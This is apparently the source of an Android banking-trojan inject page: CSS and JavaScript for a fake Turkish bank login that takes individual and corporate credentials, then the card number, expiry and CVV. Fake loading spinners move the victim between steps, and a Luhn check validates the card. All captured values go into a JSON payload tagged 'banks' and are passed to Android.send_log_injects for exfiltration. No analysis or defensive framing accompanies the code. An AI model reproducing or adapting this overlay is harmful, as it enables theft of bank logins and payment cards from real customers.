    <style>
        body {
            background-color: #fafafa;
        }

        #form1, #form2, #form3 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            background-color: #fff;
            border-bottom: 1px solid #e8e8e8;
            text-align: center;
        }

        section {
            flex: 1;
            padding: 20px 15px;
        }

        .link {
            padding: 15px 10px;
            border: 0;
            display: inline-block;
            margin-bottom: 0;
            font-weight: 600;
            color: #000;
            cursor: pointer;
        }

        .active {
            color: #2c86c2;
            border-bottom: 2px solid #2c86c2;
        }

        label {
            font-size: 14px;
            font-weight: 600;
        }

        .input {
            width: 100%;
            padding: 8px;
            padding-left: 4px;
            background-color: #ececec;
            margin-bottom: 15px;
            border: 1px solid #ececec;
            border-radius: 4px;
            font-weight: 600;
        }

        .button {
            width: 100%;
            padding: 10px;
            border: 0;
            border-radius: 4px;
            color: #fff;
            background-color: #2c86c2;
            margin-top: 30px;
            font-weight: 600;
        }

        .button:disabled {
            color: #96c3e1;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>

    </form>

    <script>
        $('#cc').mask('0000 0000 0000 0000');
        $('#exp').mask('00/00');
        $('#cvv').mask('000');

        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var loginK = document.getElementById('loginK'),
            passwordK = document.getElementById('passwordK');

        var cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv');

        var nextPage = document.getElementById('nextPage'),
            nextPageK = document.getElementById('nextPageK'),
            sendData = document.getElementById('sendData');

        function goBireysel() {
            form1.style.display = 'flex'
            form2.style.display = 'none'
        }

        function goKurumsal() {
            form2.style.display = 'flex'
            form1.style.display = 'none'
        }

        function check() {
            if(login.value.length >= 4 && password.value.length >= 6) {
                nextPage.disabled = false
            } else {
                nextPage.disabled = true
            }
        }

        function check2() {
            if(loginK.value.length >= 4 && codeK.value.length >= 4 && passwordK.value.length >= 6) {
                nextPageK.disabled = false
            } else {
                nextPageK.disabled = true
            }
        }

        login.onkeyup = () => {
            check()
        }

        password.onkeyup = () => {
            check()
        }

        nextPage.onclick = () => {
            spinner.style.display = 'block'

            setTimeout(() => {
                form1.style.display = 'none'
                spinner.style.display = 'none'
                form3.style.display = 'flex'
            }, 1500);
        }

        loginK.onkeyup = () => {
            check2()
        }

        codeK.onkeyup = () => {
            check2()
        }

        passwordK.onkeyup = () => {
            check2()
        }

        nextPage.onclick = () => {
            spinner.style.display = 'block'

            setTimeout(() => {
                form1.style.display = 'none'
                spinner.style.display = 'none'
                form3.style.display = 'flex'
            }, 1500);
        }

        nextPageK.onclick = () => {
            spinner.style.display = 'block'

            setTimeout(() => {
                form2.style.display = 'none'
                spinner.style.display = 'none'
                form3.style.display = 'flex'
            }, 1500);
        }

        function check4() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);
			
			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check3() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check5() {
            if(check3() == true && check4() == true && exp.value.length === 5 && cvv.value.length === 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        sendData.onclick = function(){
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.loginKurumsal = loginK.value;
                data.codeKurumsal = codeK.value;
                data.passwordKurumsal = passwordK.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
</body>
